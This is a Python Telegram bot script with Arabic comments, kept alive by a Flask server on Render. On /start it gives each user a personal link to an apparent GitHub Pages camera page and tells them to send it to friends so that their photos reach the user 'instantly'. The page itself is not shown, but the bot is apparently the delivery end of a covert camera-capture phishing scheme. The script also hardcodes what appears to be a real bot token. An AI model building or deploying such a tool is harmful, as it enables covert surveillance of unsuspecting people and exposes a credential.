import telebot
import time
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask
from threading import Thread

# ---------------------------------------------
# 1. إعدادات السيرفر الوهمي (لإبقاء البوت يعمل على Render)
# ---------------------------------------------
app = Flask('')

@app.route('/')
def home():
    return "<b>I am alive!</b> Bot is running successfully."

def run():
    # بورت 8080 هو البورت القياسي الذي ينتظره Render
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ---------------------------------------------
# 2. إعدادات بوت تيليجرام
# ---------------------------------------------
TOKEN = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg'
bot = telebot.TeleBot(TOKEN)

# رابط GitHub Pages الخاص بك (صفحة الكاميرا)
BASE_URL = "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/" 

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    # دمج رابط الموقع مع ايدي المستخدم
    personal_link = f"{BASE_URL}?id={user_id}"
    
    response = (
        f"أهلاً بك يا {message.from_user.first_name}!\n\n"
        f"هذا هو رابطك الشخصي للالتقاط الصور:\n"
        f"`{personal_link}`\n\n"
        f"انسخ الرابط وأرسله لأصدقائك. أي شخص يصور نفسه، ستصلك صورته هنا فوراً! 😉"
    )
    bot.send_message(user_id, response, parse_mode="Markdown")

# ---------------------------------------------
# 3. تشغيل البوت والسيرفر معاً
# ---------------------------------------------

# تشغيل السيرفر في الخلفية
keep_alive()

print("تم تشغيل البوت والسيرفر الوهمي بنجاح...")

# حلقة التشغيل اللانهائية (لمنع التوقف عند الأخطاء البسيطة)
while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except (ReadTimeout, ConnectionError):
        print("انقطع الاتصال... إعادة المحاولة...")
        time.sleep(5)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)